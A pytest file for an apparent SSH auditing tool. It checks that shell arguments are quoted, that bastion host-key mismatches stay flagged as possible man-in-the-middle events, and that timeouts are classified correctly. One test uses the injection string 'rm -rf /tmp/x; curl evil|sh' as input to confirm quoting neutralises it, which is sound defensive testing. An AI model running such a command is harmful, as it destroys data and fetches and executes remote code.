"""Tests for grc_auditor.remote error classification.

Focus: a host-key MISMATCH on the BASTION must keep its security-signal type so
the caller routes it to HOST_KEY_MISMATCH, not plain UNREACHABLE. No live SSH --
we drive the pure classifier with fabricated paramiko exceptions.
"""

from __future__ import annotations

import base64
import socket

import paramiko
import pytest

import grc_auditor.remote as remote_mod
from grc_auditor.config import CredentialGroup
from grc_auditor.remote import (
    BastionError, CommandResult, ConnectionFailed, HostKeyMismatch,
    RemoteError, RemoteHost, _bastion_error, _classify_connect_error,
)


def test_run_argv_quotes_every_token():
    # run_argv must shell-quote each token so a value containing shell
    # metacharacters (e.g. derived from a hostile target's command output)
    # cannot break out of the intended argument and inject a command.
    captured = {}

    class _Conn(RemoteHost):
        def __init__(self):
            pass

        def run(self, command, *, sudo=False, timeout=None):
            captured["command"] = command
            captured["sudo"] = sudo
            return CommandResult(0, "", "")

    _Conn().run_argv(["rm", "-rf", "/tmp/x; curl evil|sh"], sudo=True)
    assert captured["command"] == "rm -rf '/tmp/x; curl evil|sh'"
    assert captured["sudo"] is True


class _FakeKey:
    """Minimal stand-in for a paramiko host key (the bits remote.py touches)."""

    def __init__(self, name="ssh-ed25519", blob=b"\x01\x02\x03"):
        self._name = name
        self._blob = blob

    def asbytes(self) -> bytes:
        return self._blob

    def get_name(self) -> str:
        return self._name

    def get_base64(self) -> str:
        return base64.b64encode(self._blob).decode("ascii")


def test_bastion_host_key_mismatch_preserves_security_signal():
    # A key mismatch on the jump host is a possible MITM -- it must surface as a
    # HostKeyMismatch (which cli routes to HOST_KEY_MISMATCH), not be flattened
    # into a generic BastionError that demotes it to UNREACHABLE.
    exc = paramiko.BadHostKeyException(
        "bastion.example.com", _FakeKey(blob=b"got"), _FakeKey(blob=b"want")
    )
    err = _bastion_error(exc, "bastion jump@bastion.example.com:22")

    assert isinstance(err, HostKeyMismatch)
    assert not isinstance(err, BastionError)   # type not flattened
    assert "bastion" in str(err).lower()


def test_bastion_non_key_failure_is_a_bastion_error():
    err = _bastion_error(socket.timeout("timed out"),
                         "bastion jump@bastion.example.com:22")

    assert isinstance(err, BastionError)
    assert not isinstance(err, HostKeyMismatch)


# --------------------------------------------------------------------------- #
# Timeout paths (ELI-141)
#
# The failure mode that matters here is a fleet scan hanging or silently
# dropping hosts. These tests pin: a connect-level timeout is classified as a
# ConnectionFailed (a RemoteError, so a caller's `except RemoteError` still
# catches it and the host is bucketed UNREACHABLE), and a command that times
# out mid-run raises RemoteError rather than blocking or returning a bogus
# CommandResult. No live SSH -- fabricated paramiko/socket exceptions and a
# fake exec_command stream drive it offline.
# --------------------------------------------------------------------------- #
def test_connect_timeout_is_classified_as_connection_failed():
    err = _classify_connect_error(socket.timeout("timed out"), "10.0.10.21")

    assert isinstance(err, ConnectionFailed)
    assert isinstance(err, RemoteError)
    assert "timed out" in str(err)


class _FakeTimeoutSSHClient:
    """Stands in for paramiko.SSHClient: connect() always times out, and
    records whether it was torn down so a timed-out attempt never leaks."""

    def __init__(self):
        self.closed = False

    def load_system_host_keys(self):
        pass

    def load_host_keys(self, path):
        pass

    def set_missing_host_key_policy(self, policy):
        pass

    def connect(self, **kwargs):
        raise socket.timeout("timed out")

    def close(self):
        self.closed = True


def test_connect_timeout_raises_connection_failed_and_tears_down_client(monkeypatch):
    fake_client = _FakeTimeoutSSHClient()
    monkeypatch.setattr(remote_mod.paramiko, "SSHClient", lambda: fake_client)

    group = CredentialGroup(name="lab", ssh_user="ubuntu", targets=["default"])
    rh = RemoteHost("10.0.10.21", group, known_hosts=None)

    with pytest.raises(ConnectionFailed):
        rh.connect()
    # A timed-out connect attempt must not leak a half-open client.
    assert fake_client.closed is True


class _RaisingStream:
    """A paramiko command-output stream whose read() always times out, as if
    the command wedged mid-run and the channel's own timeout tripped."""

    class _Channel:
        def close(self):
            pass

    def __init__(self):
        self.channel = self._Channel()

    def read(self, n):
        raise socket.timeout("timed out")


class _FakeStdin:
    class _Channel:
        def shutdown_write(self):
            pass

    channel = _Channel()


class _FakeConnectedClient:
    """A connected paramiko client whose exec_command hands back a stream that
    times out on read, simulating a command that hangs mid-run."""

    def exec_command(self, command, timeout=None):
        return _FakeStdin(), _RaisingStream(), _RaisingStream()


def test_run_command_timeout_mid_run_raises_remote_error_not_a_hang():
    group = CredentialGroup(name="lab", ssh_user="ubuntu", targets=["default"])
    rh = RemoteHost("10.0.10.21", group, known_hosts=None)
    rh._client = _FakeConnectedClient()

    with pytest.raises(RemoteError, match="timed out"):
        rh.run("some-long-running-command", timeout=5)
